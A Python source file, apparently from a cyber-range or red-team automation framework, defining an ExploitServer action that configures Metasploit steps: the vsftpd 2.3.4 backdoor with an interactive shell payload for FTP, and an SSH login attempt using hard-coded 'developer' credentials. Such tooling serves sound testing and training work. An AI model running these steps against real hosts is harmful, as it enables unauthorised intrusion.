from cyst_models.cryton.actions.action import Action, ExternalResources


class ExploitServer(Action):
    def __init__(
        self,
        message_id: int,
        caller_id: str,
        external_resources: ExternalResources,
        target: str,
        service: str,
    ):
        if service == "ftp":
            module_arguments = {
                "module_name": "unix/ftp/vsftpd_234_backdoor",
                "datastore": {"payload": "cmd/unix/interact", "RHOSTS": target},
                "module_retries": 3,
            }
        elif service == "ssh":
            module_arguments = {
                "module_name": "scanner/ssh/ssh_login",
                "datastore": {
                    "RHOSTS": target,
                    "USERNAME": "developer",
                    "PASSWORD": "developer",
                },
                "module_retries": 3,
            }
        else:
            raise RuntimeError(f"Unsupported service {service}.")

        template = {
            "name": f"exploit-server-{message_id}",
            "step_type": "worker/execute",
            "arguments": {"module": "metasploit", "module_arguments": module_arguments},
        }
        super().__init__(message_id, template, caller_id, external_resources)
